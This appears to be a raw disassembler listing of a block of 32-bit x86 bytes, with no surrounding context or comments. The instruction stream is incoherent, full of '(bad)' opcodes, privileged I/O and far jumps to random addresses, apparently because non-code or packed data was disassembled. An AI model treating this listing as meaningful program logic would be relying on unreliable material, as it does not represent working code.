  4047a5:	add    BYTE PTR [ebp-0x3ab44cff],0x47
  4047ac:	mov    cl,0x24
  4047ae:	fwait
  4047af:	test   DWORD PTR [eax-0x44282a2f],esi
  4047b5:	push   cs
  4047b6:	jl     0x4047d3
  4047b8:	mov    edx,0xb85d49e7
  4047bd:	enter  0x9f6f,0xb9
  4047c1:	nop
  4047c2:	lea    eax,[ebx-0x52a2e322]
  4047c8:	sbb    al,0x15
  4047ca:	xchg   esp,eax
  4047cb:	dec    edi
  4047cc:	pop    edx
  4047cd:	movsx  ebx,cx
  4047d0:	xchg   edi,eax
  4047d1:	push   es
  4047d2:	fimul  DWORD PTR [eax+eax*1]
  4047d5:	nop
  4047d6:	ss and al,0xbc
  4047d9:	clc    
  4047da:	fs ret 0x9
  4047de:	add    BYTE PTR [eax],al
  4047e0:	add    BYTE PTR [eax],al
  4047e2:	cli    
  4047e3:	(bad)  
  4047e4:	jle    0x40479b
  4047e6:	xor    BYTE PTR [eax-0x33f09d89],0x9a
  4047ed:	ficomp WORD PTR [edi+0x15]
  4047f0:	dec    edi
  4047f1:	imul   esi,DWORD PTR [ebp+0x25d6d232],0xfffffff8
  4047f8:	loope  0x4047ad
  4047fa:	push   ebp
  4047fb:	push   ebx
  4047fc:	pop    edi
  4047fd:	or     ch,dh
  4047ff:	mov    ebp,0xdaffbdaa
  404804:	test   DWORD PTR [ecx],eax
  404806:	aas    
  404807:	sub    DWORD PTR [edi-0x2a],0x6ab21eca
  40480e:	bound  ebp,QWORD PTR [esi+edx*1]
  404811:	fbstp  TBYTE PTR [eax]
  404813:	(bad)  
  404814:	cli    
  404815:	(bad)  
  404816:	call   0xe0597fa3
  40481b:	arpl   dx,bx
  40481d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40481e:	sub    ch,ch
  404820:	lea    edx,[eax]
  404822:	sub    cl,BYTE PTR [edx]
  404824:	xchg   ebp,eax
  404825:	lods   al,BYTE PTR ds:[esi]
  404826:	rcl    BYTE PTR [ecx+0x6e3f7bca],cl
  40482c:	addr16 (bad) 
  40482e:	scas   eax,DWORD PTR es:[edi]
  40482f:	sbb    al,0x5
  404831:	jb     0x4047b8
  404833:	mov    bh,0x3f
  404835:	into   
  404836:	aad    0x28
  404838:	lods   eax,DWORD PTR cs:[esi]
  40483a:	and    eax,0xa510f506
  40483f:	mov    dl,0x2c
  404841:	pop    ecx
  404842:	xor    al,0xaf
  404844:	jno    0x4047fa
  404846:	add    BYTE PTR [eax],al
  404848:	add    BYTE PTR [eax],al
  40484a:	add    BYTE PTR [eax-0x30543fc9],cl
  404850:	retf   
  404851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404852:	nop
  404853:	arpl   WORD PTR [ebx+ebx*2],dx
  404856:	in     al,0xd5
  404858:	and    DWORD PTR [esi],edi
  40485a:	dec    ecx
  40485b:	dec    edx
  40485c:	mov    edx,0x128270b9
  404861:	pushf  
  404862:	retf   
  404863:	push   es
  404864:	retf   0x2892
  404867:	imul   edi,DWORD PTR [edi+esi*4+0x4e240f03],0xffffffdc
  40486f:	dec    edi
  404870:	lahf   
  404871:	rol    DWORD PTR [eax-0x5c],cl
  404874:	inc    esi
  404875:	lds    edx,FWORD PTR [ebx+0x786837e9]
  40487b:	ins    DWORD PTR es:[edi],dx
  40487c:	mov    al,0x96
  40487e:	mov    BYTE PTR [esi],dl
  404880:	pop    eax
  404881:	jnp    0x404826
  404883:	mov    edx,0x1f514d0f
  404888:	dec    bh
  40488a:	jmp    0x40482e
  40488c:	gs popa 
  40488e:	repz jae 0x40486a
  404891:	sbb    DWORD PTR [eax],0xffffffb8
  404894:	cmp    dl,0xbb
  404897:	cmp    eax,0xe1611f73
  40489c:	jmp    0x80aa:0xe26b9b45
  4048a3:	pop    ds
  4048a4:	jnp    0x4048c3
  4048a6:	aam    0x71
  4048a8:	mov    BYTE PTR [eax+0x50d10638],ah
  4048ae:	xor    BYTE PTR [eax],al
  4048b0:	add    BYTE PTR [eax],al
  4048b2:	add    BYTE PTR [eax],al
  4048b4:	leave  
  4048b5:	ins    DWORD PTR es:[edi],dx
  4048b6:	je     0x4048c3
  4048b8:	sbb    eax,0x5068c9f6
  4048bd:	pop    es
  4048be:	out    dx,eax
  4048bf:	ret    
  4048c0:	add    al,0x60
  4048c2:	push   cs
  4048c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048c4:	inc    ebx
  4048c5:	dec    esi
  4048c6:	cmp    eax,DWORD PTR [edx]
  4048c8:	pop    ecx
  4048c9:	xchg   ecx,eax
  4048ca:	sub    DWORD PTR [ebx+ebp*8],0x47
  4048ce:	xchg   ecx,eax
  4048cf:	dec    ecx
  4048d0:	mov    al,0x98
  4048d2:	sub    eax,esi
  4048d4:	dec    eax
  4048d5:	out    dx,eax
  4048d6:	mov    bl,0x8d
  4048d8:	repz jb 0x4048e7
  4048db:	pop    ebx
  4048dc:	and    bh,ah
  4048de:	sbb    eax,0xa67afaf6
  4048e3:	mov    ah,0x7b
  4048e5:	(bad)  
  4048e6:	xchg   ebp,eax
  4048e7:	xchg   ecx,eax
  4048e8:	mov    al,0x15
  4048ea:	sub    eax,0x3fcf249f
  4048ef:	mov    edx,0x438713ff
  4048f4:	iret   
  4048f5:	fs sbb bl,dh
  4048f8:	sub    edi,eax
  4048fa:	mov    eax,ds:0xb06d97c8
  4048ff:	lods   al,BYTE PTR gs:[esi]
  404901:	icebp  
  404902:	pop    es
  404903:	fwait
  404904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404905:	adc    dl,BYTE PTR [eax+0x76]
  404908:	jg     0x4048d3
  40490a:	call   0xfa5c154f
  40490f:	frstor [esi]
  404911:	mov    DWORD PTR [edx+0x6c],0x89def037
  404918:	add    BYTE PTR [eax],al
  40491a:	add    BYTE PTR [eax],al
  40491c:	add    BYTE PTR [esp+ebp*2],cl
  40491f:	idiv   DWORD PTR ds:0x74f8
  404924:	adc    dl,ah
  404926:	gs int 0x4b
  404929:	(bad)  
  40492a:	mov    edi,0x2364a6c5
  40492f:	jge    0x404941
  404931:	push   edi
  404932:	mov    dh,0x6f
  404934:	lods   eax,DWORD PTR ds:[esi]
  404935:	mov    bl,0x2a
  404937:	xlat   BYTE PTR ds:[ebx]
  404938:	pop    esp
  404939:	pushf  
  40493a:	pop    ebp
  40493b:	dec    edx
  40493c:	jns    0x404935
  40493e:	add    dl,dh
  404940:	add    bh,dl
  404942:	mov    al,ds:0x3f2ee68
  404947:	xlat   BYTE PTR ds:[ebx]
  404948:	push   esi
  404949:	xor    al,0xd4
  40494b:	mov    ch,0xe
  40494d:	xchg   ecx,eax
  40494e:	jbe    0x40495b
  404950:	mov    dh,0xbf
  404952:	sbb    eax,0x3e5aa4be
  404957:	add    bl,BYTE PTR [ebx+eiz*8]
  40495a:	adc    ch,0x81
  40495d:	push   es
  40495e:	and    al,0x69
  404960:	cmp    DWORD PTR [eax-0x32],ebp
  404963:	fsubr  QWORD PTR [ebx]
  404965:	mov    ebp,0xaa9362eb
  40496a:	inc    ebx
  40496b:	sub    BYTE PTR [ebx],bh
  40496d:	punpcklwd mm2,DWORD PTR [ebx+eax*4-0x6edff3df]
  404975:	aam    0xa8
  404977:	popf   
  404978:	sub    DWORD PTR [ebp-0x6a],ebx
  40497b:	dec    edx
  40497c:	mov    ah,0x78
  40497e:	mov    ch,0xf6
  404980:	or     al,0x0
  404982:	add    BYTE PTR [eax],al
  404984:	add    BYTE PTR [eax],al
  404986:	ss pop eax
  404988:	inc    ebx
  404989:	push   ds
  40498a:	adc    edi,ebp
  40498c:	(bad)  
  40498d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40498e:	push   ebp
  40498f:	sub    eax,0x87f0fe9c
  404994:	and    BYTE PTR [esi-0x62],al
  404997:	jecxz  0x40492c
  404999:	push   esp
  40499a:	jnp    0x40495c
  40499c:	sub    esp,ebp
  40499e:	ret    0xfe77
  4049a1:	jno    0x4049ca
  4049a3:	fld    QWORD PTR [ecx+ecx*8+0x9]
  4049a7:	xor    bh,dh
  4049a9:	fistp  DWORD PTR [ebx+edx*1+0x4fe5634b]
  4049b0:	xor    DWORD PTR [ebx-0x40],ebp
  4049b3:	hlt    
  4049b4:	mov    ebx,ss
  4049b6:	cs cwde 
  4049b8:	cmp    cl,al
  4049ba:	dec    ebx
  4049bb:	mov    ebp,0x90907984
  4049c0:	fcomp  DWORD PTR [esp+ebp*1+0x6c]
  4049c4:	cmp    eax,0x90196ce1
  4049c9:	push   esp
  4049ca:	push   esi
  4049cb:	mov    dh,0x72
  4049cd:	call   0x8bc572d8
  4049d2:	es add al,0xa0
  4049d5:	aaa    
  4049d6:	xchg   BYTE PTR [ecx+0x6e8c824d],dl
  4049dc:	call   0xf03e661e
  4049e1:	call   0x55556497
  4049e6:	sub    DWORD PTR [ebp+0xe0b8],eax
  4049ec:	add    BYTE PTR [eax],al
  4049ee:	add    BYTE PTR [ebx],bl
  4049f0:	mov    al,ds:0x20835c5d
  4049f5:	pop    ebx
  4049f6:	pop    ecx
  4049f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049f8:	cmp    edi,DWORD PTR [edx+0x104945e5]
  4049fe:	push   eax
  4049ff:	dec    edi
  404a00:	es cmc 
  404a02:	jmp    0x4049a3
  404a04:	jne    0x4049f3
  404a06:	cmp    dh,BYTE PTR [edx]
  404a08:	ror    BYTE PTR [edx-0x79],cl
  404a0b:	push   0xfffffffc
  404a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a0e:	xor    bl,BYTE PTR [eax+0x57]
  404a11:	or     BYTE PTR [esi-0x128fb200],0xa8
  404a18:	push   0xffffff95
  404a1a:	push   ecx
  404a1b:	add    BYTE PTR [eax+edi*1-0x1c],dh
  404a1f:	adc    cl,bh
  404a21:	fist   DWORD PTR [edi-0x66]
  404a24:	pop    eax
  404a25:	add    eax,0x20332f8f
  404a2a:	xor    ebp,DWORD PTR [edi-0x6a79341f]
  404a30:	mov    esi,0x7d053a68
  404a35:	lods   eax,DWORD PTR ds:[esi]
  404a36:	inc    eax
  404a37:	cmc    
  404a38:	sbb    DWORD PTR [eax+0x18b295fc],ecx
  404a3e:	jmp    0x404a18
  404a40:	ret    
  404a41:	mov    ebp,0x541b254d
  404a46:	push   ss
  404a47:	jb     0x4049e9
  404a49:	jns    0x404a3e
  404a4b:	sub    eax,0xbb5dcf38
  404a50:	dec    edx
  404a51:	sar    BYTE PTR [edx+0x0],cl
  404a57:	add    BYTE PTR [edi],ah
  404a59:	xchg   edx,eax
  404a5a:	lods   al,BYTE PTR ds:[esi]
  404a5b:	retf   0x69fc
  404a5e:	icebp  
  404a5f:	ins    DWORD PTR es:[edi],dx
  404a60:	pop    eax
  404a61:	repnz es add esp,ebp
  404a65:	dec    DWORD PTR [ecx+0x26]
  404a68:	push   ecx
  404a69:	pop    eax
  404a6a:	sti    
  404a6b:	cmp    eax,0xda9de2fe
  404a70:	jns    0x404aed
  404a72:	push   eax
  404a73:	jbe    0x404a9c
  404a75:	(bad)  
  404a76:	cmc    
  404a77:	xchg   edx,eax
  404a78:	jae    0x404a4f
  404a7a:	loope  0x404a76
  404a7c:	sub    bh,BYTE PTR [ebp-0x79]
  404a7f:	sbb    eax,0xb278e4c7
  404a84:	xor    dl,bl
  404a86:	fist   DWORD PTR [ebp-0x42]
  404a89:	mov    dh,BYTE PTR ds:0x17f0898e
  404a8f:	stos   DWORD PTR es:[edi],eax
  404a90:	inc    ebp
  404a91:	ins    DWORD PTR es:[edi],dx
  404a92:	scas   al,BYTE PTR es:[edi]
  404a93:	inc    ebp
  404a94:	nop
  404a95:	pop    edx
  404a96:	jae    0x404a7a
  404a98:	cmp    eax,DWORD PTR [ebx]
  404a9a:	int    0xd2
  404a9c:	push   esi
  404a9d:	cmp    edx,DWORD PTR [eax+0x35]
  404aa0:	repz mov ds:0x953e9b06,al
  404aa6:	jmp    0x404b25
  404aa8:	jmp    0xbfb2:0x15655a4c
  404aaf:	ret    0x2991
  404ab2:	mov    cl,0x2d
  404ab4:	cld    
  404ab5:	pop    ss
  404ab6:	adc    al,0xb
  404ab8:	mov    BYTE PTR [edi+0x530e],bh
  404abe:	add    BYTE PTR [eax],al
  404ac0:	add    ch,al
  404ac2:	adc    ebp,DWORD PTR fs:[esi+0x3a]
  404ac6:	clc    
  404ac7:	stos   BYTE PTR es:[edi],al
  404ac8:	clc    
  404ac9:	or     eax,0xf2d5b96e
  404ace:	icebp  
  404acf:	add    BYTE PTR [edx+ebx*8],ah
  404ad2:	ret    0x819c
  404ad5:	ins    DWORD PTR es:[edi],dx
  404ad6:	push   ss
  404ad7:	and    al,0xaf
  404ad9:	add    cl,bl
  404adb:	or     ah,BYTE PTR ss:[esi-0x524371f1]
  404ae2:	lock aad 0xd9
  404ae5:	xchg   edx,eax
  404ae6:	ins    BYTE PTR es:[edi],dx
  404ae7:	outs   dx,BYTE PTR ds:[esi]
  404ae8:	daa    
  404ae9:	jne    0x404ae4
  404aeb:	jnp    0x404a6f
  404aed:	retf   0xc465
  404af0:	retf   
  404af1:	add    cl,BYTE PTR [edi]
  404af3:	pop    ecx
  404af4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404af5:	inc    ebp
  404af6:	retf   0x50e1
  404af9:	jmp    0x4bc3:0x7d2df316
  404b00:	out    dx,eax
  404b01:	in     eax,0x77
  404b03:	js     0x404a8f
  404b05:	sbb    ah,ah
  404b07:	mov    edi,0xd275b274
  404b0c:	rcl    DWORD PTR [ebp-0x16],1
  404b0f:	imul   edi,DWORD PTR [eax],0x15f79975
  404b15:	mov    al,BYTE PTR [edi+ecx*2-0x5d]
  404b19:	fst    QWORD PTR [eax+0x4c427e5d]
  404b1f:	in     eax,0xc0
  404b21:	push   edx
  404b22:	jmp    0x404ae0
  404b24:	pop    ebp
  404b25:	add    BYTE PTR [eax],al
  404b27:	add    BYTE PTR [eax],al
  404b29:	add    ch,dh
  404b2b:	outs   dx,DWORD PTR ds:[esi]
  404b2c:	add    eax,0x16e29a0b
  404b31:	out    0xac,al
  404b33:	jbe    0x404ae4
  404b35:	push   edi
  404b36:	popf   
  404b37:	dec    ebp
  404b38:	xor    dh,BYTE PTR [edx+0x8a9062]
  404b3e:	add    al,0x66
  404b40:	pushf  
  404b41:	xchg   esi,eax
  404b42:	cdq    
  404b43:	dec    esp
  404b44:	and    BYTE PTR [esi],ch
  404b46:	loopne 0x404acf
  404b48:	pop    edx
  404b49:	es mov ebp,0x2b9ee62c
  404b4f:	mov    esi,0xe3468c53
  404b54:	in     eax,dx
  404b55:	xor    al,0x6f
  404b57:	fdivr  QWORD PTR [edx]
  404b59:	test   eax,0x11847712
  404b5e:	xor    al,0x13
  404b60:	xor    DWORD PTR [ebx],eax
  404b62:	mov    DWORD PTR [edi],ebp
  404b64:	lea    edi,[ebx-0x1c11a1c9]
  404b6a:	retf   0x5242
  404b6d:	pop    ebx
  404b6e:	lods   al,BYTE PTR ds:[esi]
  404b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b70:	out    0x49,eax
  404b72:	adc    DWORD PTR [edx+ebx*2],ecx
  404b75:	icebp  
  404b76:	enter  0x8cb2,0x6c
  404b7a:	cmc    
  404b7b:	lea    esi,[eax]
  404b7d:	aam    0x63
  404b7f:	cld    
  404b80:	test   dh,al
  404b82:	outs   dx,BYTE PTR ds:[esi]
  404b83:	push   edi
  404b84:	cmp    DWORD PTR [esi+0x1],edi
  404b87:	outs   dx,BYTE PTR ds:[esi]
  404b88:	jno    0x404b60
  404b8a:	sbb    al,0xd3
  404b8c:	retf   
  404b8d:	outs   dx,BYTE PTR ds:[esi]
  404b8e:	add    BYTE PTR [eax],al
  404b90:	add    BYTE PTR [eax],al
  404b92:	add    BYTE PTR [edx],cl
  404b94:	ss js  0x404c13
  404b97:	out    0x1a,eax
  404b99:	(bad)  
  404b9a:	les    ecx,FWORD PTR [esi+0x24]
  404b9d:	adc    ebx,DWORD PTR [ecx+0x73]
  404ba0:	jg     0x404b51
  404ba2:	loope  0x404bf9
  404ba4:	jmp    0x4ba6:0xc6e8f31c
  404bab:	push   ss
  404bac:	xchg   edi,eax
  404bad:	lds    edx,FWORD PTR [ebx]
  404baf:	jmp    0x404b6a
  404bb1:	jns    0x404b5e
  404bb3:	int    0x4d
  404bb5:	int3   
  404bb6:	mov    ecx,0x16ff270
  404bbb:	nop
  404bbc:	pop    ecx
  404bbd:	xchg   edi,eax
  404bbe:	test   eax,0x15722f2c
  404bc3:	ins    BYTE PTR es:[edi],dx
  404bc4:	in     al,0xde
  404bc6:	lahf   
  404bc7:	xchg   BYTE PTR [edi+0x79061c3b],dh
  404bcd:	jmp    DWORD PTR [ebp+0x16]
  404bd0:	sbb    al,0x1a
  404bd2:	fisub  DWORD PTR [esi-0x43]
  404bd5:	mov    ah,0x6f
  404bd7:	ins    BYTE PTR es:[edi],dx
  404bd8:	and    dl,BYTE PTR [edx-0x2d]
  404bdb:	cld    
  404bdc:	mov    DWORD PTR [edx-0x50a166fc],ecx
  404be2:	mov    eax,0xd41f541
  404be7:	xor    ecx,DWORD PTR [eax]
  404be9:	out    0xb0,eax
  404beb:	fwait
  404bec:	adc    edi,edx
  404bee:	rcl    DWORD PTR [ebx-0x1a],1
  404bf1:	xor    DWORD PTR [esi-0x15],ebp
  404bf4:	pushf  
  404bf5:	lahf   
  404bf6:	fild   DWORD PTR [eax]
  404bf8:	add    BYTE PTR [eax],al
  404bfa:	add    BYTE PTR [eax],al
  404bfc:	jmp    0x41a7c670
  404c01:	loopne 0x404c64
  404c03:	mov    al,0xdc
  404c05:	inc    ebx
  404c06:	(bad)  
  404c07:	or     al,0x3c
  404c09:	test   DWORD PTR [edx],ebp
  404c0b:	mov    ecx,0x50dea36
  404c10:	(bad)  
  404c11:	(bad)  [eax+eax*1]
  404c14:	nop
  404c15:	pusha  
  404c16:	or     al,0x30
  404c18:	(bad)  
  404c19:	inc    DWORD PTR [ebx]
  404c1b:	popa   
  404c1c:	ins    BYTE PTR es:[edi],dx
  404c1d:	xor    al,BYTE PTR ds:0x27d8da51
  404c23:	les    ebp,FWORD PTR [ecx+0x17f42089]
  404c29:	add    ch,BYTE PTR [ebx]
  404c2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c2c:	lds    eax,FWORD PTR [edi-0x30cc6ad2]
  404c32:	mov    cl,0x88
  404c34:	mov    ds:0x2cb8b6a2,al
  404c39:	mov    dl,0x87
  404c3b:	scas   eax,DWORD PTR es:[edi]
  404c3c:	imul   ecx,eax,0x3a39b678
  404c42:	out    dx,al
  404c43:	push   ecx
  404c44:	fcomp  QWORD PTR [ebx+0x25c45301]
  404c4a:	sbb    BYTE PTR [ebp+ebp*2-0x51],0x57
  404c4f:	pop    ecx
  404c50:	xchg   ebp,eax
  404c51:	inc    ecx
  404c52:	ficom  DWORD PTR [eax-0x80]
  404c55:	dec    esi
  404c56:	or     eax,0x53e47054
  404c5b:	pop    ebx
  404c5c:	mov    eax,ds:0x5a6b7a
  404c61:	add    BYTE PTR [eax],al
  404c63:	add    BYTE PTR [eax],al
  404c65:	ror    DWORD PTR [eax],1
  404c67:	std    
  404c68:	mov    ebp,0xb6b264e4
  404c6d:	in     al,dx
  404c6e:	fidiv  DWORD PTR [edx]
  404c70:	mov    al,0x45
  404c72:	and    DWORD PTR [ebp+esi*4+0xd],0x827d3ef
  404c7a:	or     bl,0x2c
  404c7d:	cmp    dl,dh
  404c7f:	sub    DWORD PTR [esi],esp
  404c81:	fldcw  WORD PTR [ebx+0x7d]
  404c84:	pop    ds
  404c85:	leave  
  404c86:	aad    0xf2
  404c88:	add    ch,BYTE PTR [edi+esi*2-0x7c]
  404c8c:	add    DWORD PTR [ecx+ecx*1],esi
  404c8f:	or     eax,0x62537d09
  404c94:	or     al,0x85
  404c96:	fnstsw WORD PTR [ebx-0x6d058fd7]
  404c9c:	sub    al,BYTE PTR [eax+0x5123b288]
  404ca2:	into   
  404ca3:	test   BYTE PTR [eax],ah
  404ca5:	and    DWORD PTR [ebx+ebx*1+0x5],esp
  404ca9:	je     0x404caf
  404cab:	sub    al,0x0
  404cad:	pop    esp
  404cae:	outs   dx,BYTE PTR ds:[esi]
  404caf:	xchg   ebp,eax
  404cb0:	push   es
  404cb1:	adc    eax,0x3d0d89e8
  404cb6:	pop    edx
  404cb7:	push   cs
  404cb8:	cld    
  404cb9:	ficomp WORD PTR [edx]
  404cbb:	hlt    
  404cbc:	sub    edi,DWORD PTR [esi-0x433d9db6]
  404cc2:	sti    
  404cc3:	xlat   BYTE PTR ds:[ebx]
  404cc4:	dec    ebp
  404cc5:	mov    edi,0xdb4deb
  404cca:	add    BYTE PTR [eax],al
  404ccc:	add    BYTE PTR [eax],al
  404cce:	or     edx,DWORD PTR [edi-0x13]
  404cd1:	and    al,0x9
  404cd3:	xchg   DWORD PTR [ebx-0x5b],edi
  404cd6:	add    DWORD PTR [eax-0x57fdad3f],edi
  404cdc:	push   edi
  404cdd:	iret   
  404cde:	jmp    0x34b2:0xea18a2a2
  404ce5:	xor    eax,esp
  404ce7:	or     DWORD PTR [esi+0x1853e39e],0x8
  404cee:	pusha  
  404cef:	fidivr WORD PTR [edx+0x2cee5cb7]
  404cf5:	ss pop ebp
  404cf7:	aas    
  404cf8:	xchg   edi,eax
  404cf9:	sbb    DWORD PTR [esi+0xf],0x2a960101
  404d00:	nop
  404d01:	mov    fs,esi
  404d03:	sub    eax,0xb972f06
  404d08:	mov    esp,0x29db8458
  404d0d:	(bad)  
  404d0e:	js     0x404d76
  404d10:	mov    DWORD PTR [ecx+0x281f767b],esi
  404d16:	jb     0x404cdf
  404d18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d19:	aaa    
  404d1a:	jno    0x404cb3
  404d1c:	xor    edi,DWORD PTR [edi-0x19]
  404d1f:	jae    0x404cbf
  404d21:	call   0x8148b10a
  404d26:	loop   0x404cba
  404d28:	mov    dl,0xce
  404d2a:	loope  0x404cee
  404d2c:	and    al,0x58
  404d2e:	in     eax,0x2f
  404d30:	xchg   edi,esp
  404d32:	add    BYTE PTR [eax],al
  404d34:	add    BYTE PTR [eax],al
  404d36:	add    ch,dl
  404d38:	pop    ds
  404d39:	adc    DWORD PTR [eax],eax
  404d3b:	idiv   BYTE PTR [ebp-0x16]
  404d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d3f:	popa   
  404d40:	xchg   dl,bl
  404d42:	xor    esp,DWORD PTR [ecx+0x46a2c5e5]
  404d48:	mov    cl,0xf7
  404d4a:	xor    al,0xdf
  404d4c:	mov    bh,0xa6
  404d4e:	mov    cs,WORD PTR [eax]
  404d50:	lods   al,BYTE PTR ds:[esi]
  404d51:	xchg   esi,eax
  404d52:	sbb    BYTE PTR [esi+0x31bb0398],ah
  404d58:	call   0x9762:0x92d82d33
  404d5f:	setno  BYTE PTR [edx+0x1]
  404d63:	xchg   edx,eax
  404d64:	cdq    
  404d65:	pop    edi
  404d66:	hlt    
  404d67:	push   ebp
  404d68:	lea    ebp,[edi+0x62]
  404d6b:	lods   al,BYTE PTR ds:[esi]
  404d6c:	xchg   ebx,eax
  404d6d:	fdivr  DWORD PTR ds:[ebx-0x2ab1f170]
  404d74:	out    0x99,al
  404d76:	in     eax,dx
  404d77:	add    ch,BYTE PTR [esi-0x49948455]
  404d7d:	cli    
  404d7e:	sar    DWORD PTR [ebp+ebp*4-0x7f23a836],0xd7
  404d86:	(bad)  
  404d87:	retf   
  404d88:	jae    0x404d71
  404d8a:	push   eax
  404d8b:	bound  edi,QWORD PTR [esi+esi*4-0x16]
  404d8f:	jne    0x404d18
  404d91:	xchg   BYTE PTR [ebx+ebx*1+0x2a],bh
  404d95:	adc    ebx,edi
  404d97:	mov    esp,0x49232a
  404d9c:	add    BYTE PTR [eax],al
  404d9e:	add    BYTE PTR [eax],al
  404da0:	inc    ebp
  404da1:	and    DWORD PTR [edx-0xd],esi
  404da4:	xchg   edx,eax
  404da5:	and    al,BYTE PTR [edx+0x65]
  404da8:	hlt    
  404da9:	sub    BYTE PTR [edi+0x58],0xe3
  404dad:	sbb    DWORD PTR [edi-0x32],0x740e7d0a
  404db4:	fld    QWORD PTR [edi-0x706f1dc2]
  404dba:	mov    ecx,0xb2b6d1a5
  404dbf:	xchg   ebp,eax
  404dc0:	addr16 ss mov edx,0xa348e5c4
  404dc7:	hlt    
  404dc8:	imul   ebx,DWORD PTR [ecx-0x220516dd],0x2a
  404dcf:	fstp   DWORD PTR [edi+edi*2+0x10]
  404dd3:	mov    dh,cl
  404dd5:	out    dx,eax
  404dd6:	sub    al,0xb8
  404dd8:	pusha  
  404dd9:	xchg   esi,eax
  404dda:	push   cs
  404ddb:	sub    eax,0x1d0c08c3
  404de0:	xor    eax,0xd74c0780
  404de5:	inc    esi
  404de6:	push   es
  404de7:	jl     0x404e42
  404de9:	retf   0x710f
  404dec:	fs in  al,dx
  404dee:	push   cs
  404def:	inc    ecx
  404df0:	jmp    0x9a2:0x8010040b
  404df7:	and    BYTE PTR [esi],dl
  404df9:	and    eax,0xb9adb525
  404dfe:	sub    DWORD PTR [ebp-0x2becccbd],eax
  404e04:	add    BYTE PTR [eax],al
  404e06:	add    BYTE PTR [eax],al
  404e08:	add    BYTE PTR [ecx+0xfe42a93],cl
  404e0e:	cmp    al,0xbb
  404e10:	stc    
  404e11:	xchg   esi,eax
  404e12:	mov    dl,0xb3
  404e14:	leave  
  404e15:	clc    
  404e16:	mov    DWORD PTR [ebp-0x5f734d68],edi
  404e1c:	test   al,0x4
  404e1e:	and    ebx,DWORD PTR [ebp+edi*1-0x61]
  404e22:	and    eax,DWORD PTR [ecx+0xd]
  404e25:	adc    DWORD PTR [ebp-0x6684a3aa],esp
  404e2b:	push   edi
  404e2c:	ins    BYTE PTR es:[edi],dx
  404e2d:	std    
  404e2e:	scas   al,BYTE PTR es:[edi]
  404e2f:	push   ebp
  404e30:	xor    DWORD PTR [eax+0x7f],0x58
  404e34:	mov    bl,0xe6
  404e36:	mov    dl,0xe4
  404e38:	dec    ebp
  404e39:	mov    dl,0xb6
  404e3b:	pop    ebx
  404e3c:	push   ebx
  404e3d:	bound  ecx,QWORD PTR [eax-0x33]
  404e40:	scas   eax,DWORD PTR es:[edi]
  404e41:	iret   
  404e42:	test   eax,0x1407b262
  404e47:	jecxz  0x404e01
  404e49:	scas   al,BYTE PTR es:[edi]
  404e4a:	mov    ebp,0x2f86b834
  404e4f:	les    esp,FWORD PTR [ecx]
  404e51:	fwait
  404e52:	rcr    BYTE PTR [ebx+0x20],0x9b
  404e56:	cs cli 
  404e58:	es jmp 0x831a:0xea2a2da4
  404e60:	push   es
  404e61:	push   edi
  404e62:	mov    bh,0x74
  404e64:	or     edi,DWORD PTR [edi]
  404e66:	inc    ebp
  404e67:	std    
  404e68:	add    esp,esi
  404e6a:	mov    dh,dl
  404e6c:	cld    
  404e6d:	add    BYTE PTR [eax],al
  404e6f:	add    BYTE PTR [eax],al
  404e71:	add    BYTE PTR ds:0x3057721,cl
  404e77:	outs   dx,BYTE PTR ds:[esi]
  404e78:	push   0x8fff30c
  404e7d:	add    esp,DWORD PTR [edx]
  404e7f:	pop    edx
  404e80:	fdivp  st(5),st
  404e82:	shl    ebx,1
  404e84:	dec    edi
  404e85:	and    bl,BYTE PTR [edi-0x7b]
  404e88:	addr16 pop ds
  404e8a:	ja     0x404e83
  404e8c:	in     eax,dx
  404e8d:	daa    
  404e8e:	mov    esi,0x9628c161
  404e93:	retf   
  404e94:	cmp    BYTE PTR [eax-0x4e91a375],dh
  404e9a:	stos   DWORD PTR es:[edi],eax
  404e9b:	shl    dh,cl
  404e9d:	mov    ecx,0xb688885a
  404ea2:	pop    edx
  404ea3:	neg    BYTE PTR ds:0x5152e75b
  404ea9:	push   esi
  404eaa:	scas   eax,DWORD PTR es:[edi]
  404eab:	call   0x6f369b7f
  404eb0:	xchg   DWORD PTR [ebx+0x1e],edx
  404eb3:	std    
  404eb4:	or     eax,0xe60ef61f
  404eb9:	dec    eax
  404eba:	jecxz  0x404efa
  404ebc:	jo     0x404edf
  404ebe:	aam    0xef
  404ec0:	leave  
  404ec1:	cs inc ebp
  404ec3:	in     eax,0x5b
  404ec5:	mov    eax,0x87ff59e8
  404eca:	out    0x89,eax
  404ecc:	imul   eax,DWORD PTR [esi],0x31d3b8c7
  404ed2:	ret    0x45a8
  404ed5:	xchg   ecx,eax
  404ed6:	add    BYTE PTR [eax],al
  404ed8:	add    BYTE PTR [eax],al
  404eda:	add    BYTE PTR [esi-0x76812b73],cl
  404ee0:	mov    ebp,0x6c90df42
  404ee5:	clc    
  404ee6:	sub    BYTE PTR [eax+0x73b66e5c],dl
  404eec:	ror    esp,1
  404eee:	inc    ecx
  404eef:	pushf  
  404ef0:	add    DWORD PTR [ebx-0x48],ebx
  404ef3:	ins    DWORD PTR es:[edi],dx
  404ef4:	xor    cl,ah
  404ef6:	daa    
  404ef7:	jnp    0x404f19
  404ef9:	ja     0x404e9d
  404efb:	jb     0x404f22
  404efd:	sub    BYTE PTR ds:0xc14357d,0x6d
  404f04:	add    al,0xae
  404f06:	mov    ebx,0x2537d4bb
  404f0b:	vprotd xmm9,xmm4,[eax-0x6df4f287]
  404f14:	enter  0x94b7,0xee
  404f18:	xchg   edi,eax
  404f19:	and    DWORD PTR [ecx+ecx*2],ebp
  404f1c:	popf   
  404f1d:	mov    al,0x7b
  404f1f:	inc    esi
  404f20:	lods   eax,DWORD PTR ds:[esi]
  404f21:	rol    BYTE PTR es:[edi+0x7c],cl
  404f25:	pushf  
